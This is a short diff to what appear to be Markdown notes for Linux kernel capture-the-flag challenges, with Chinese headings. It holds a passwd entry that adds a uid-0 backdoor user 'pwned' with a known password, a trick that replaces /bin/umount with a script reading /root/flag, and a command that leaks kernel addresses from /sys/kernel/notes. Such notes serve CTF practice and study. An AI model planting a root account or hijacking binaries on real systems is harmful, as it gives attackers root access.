@@ -26,7 +26,8 @@ for line in ksyms:
 ## passwd
 
 ```
-pwned:$1$aa$Sc4m1DBsyHWbRbwmIbGHq1:0:0:/root:/root:/bin/sh # 密码：lol
+pwned:$1$aa$Sc4m1DBsyHWbRbwmIbGHq1:0:0:/root:/root:/bin/sh 
+# 密码：lol
 ```
 
 ## cpio
@@ -282,4 +283,9 @@ mv bin bin1
 /bin1/echo "/bin1/cat /root/flag" > /bin/umount
 /bin1/chmod 777 /bin/umount
 exit
+```
+
+## 泄露
+```c
+cat /sys/kernel/notes
 ```
